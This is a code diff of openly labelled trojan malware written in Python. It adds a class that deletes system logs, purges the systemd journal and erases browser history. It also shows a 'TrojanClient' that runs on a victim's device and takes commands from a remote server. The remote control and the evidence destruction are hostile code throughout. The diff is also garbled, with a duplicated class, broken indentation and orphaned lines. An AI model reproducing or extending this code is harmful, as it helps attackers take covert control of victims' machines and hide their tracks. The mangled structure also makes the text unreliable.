@@ -122,8 +122,40 @@ class DeletionSystem:
                 self.deleted_files.append(path)
             except Exception:
                 pass
-         
- class TrojanClient:
+ class DeletionSystem:
+    """Erases traces of activity using Linux tools."""
+    def __init__(self):
+        self.deleted_files = []
+
+    def scrub_logs(self):
+        """Uses shell commands to delete logs."""
+        commands = [
+            "sudo rm -rf /var/log/syslog",
+            "sudo journalctl --rotate",
+            "sudo journalctl --vacuum-time=1s"
+        ]
+        for cmd in commands:
+            try:
+                subprocess.run(cmd, shell=True, check=True)
+                self.deleted_files.append(cmd)
+            except subprocess.CalledProcessError as e:
+                print(f"[SYS] Failed to run {cmd}. Exit code: {e.returncode}")
+
+    def clear_browsing_history(self):
+        """Cleans browser history and cache."""
+        paths = [
+            "~/.config/google-chrome/Default/History",
+            "~/.mozilla/firefox/*.sqlite"
+        ]
+        for path in paths:
+            try:
+                subprocess.run(["rm", "-f", path], shell=True, check=True)
+                self.deleted_files.append(path)
+            except Exception:
+                pass
+
+
+class TrojanClient:
     """The agent that runs on the victim's device."""
     def __init__(self, server_ip: str, server_port: int):
         self.server_ip = server_ip
@@ -185,12 +217,8 @@ class DeletionSystem:
             try:
                 self.sock.send(message.encode())
             except Exception:
-                self.connected = False  
-
- def listen_for_commands(self):
-     """Receives commands from the admin."""
-     while self.connected:
-         try:
+                self.connected = False        
+ 
              data = self.sock.recv(4096).decode()
              if not data: break
              self.process_command(data)
